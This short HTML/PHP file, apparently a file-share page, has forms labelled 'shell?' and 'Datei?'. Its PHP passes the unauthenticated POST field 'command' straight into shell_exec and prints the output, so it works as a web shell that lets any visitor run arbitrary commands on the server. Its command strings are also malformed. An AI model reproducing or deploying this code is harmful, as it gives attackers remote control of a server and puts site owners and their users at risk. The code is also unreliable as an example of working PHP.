<!DOCTYPE html>
<form action="fileshare.php" method="post">
shell? <input type="text" name="command">
<input type="submit">
</form>

<form action="download.php" method="post">
Datei? <input type="text" name="command">
<input type="submit">
</form>

<?php
$command = $_POST["command"];

$file_user = "admin_rv";
echo "<pre>";
echo shell_exec("cd home/ $file_user ; ls");
echo shell_exec("cd home/ $file_user " .$command);
echo "</pre>";

?>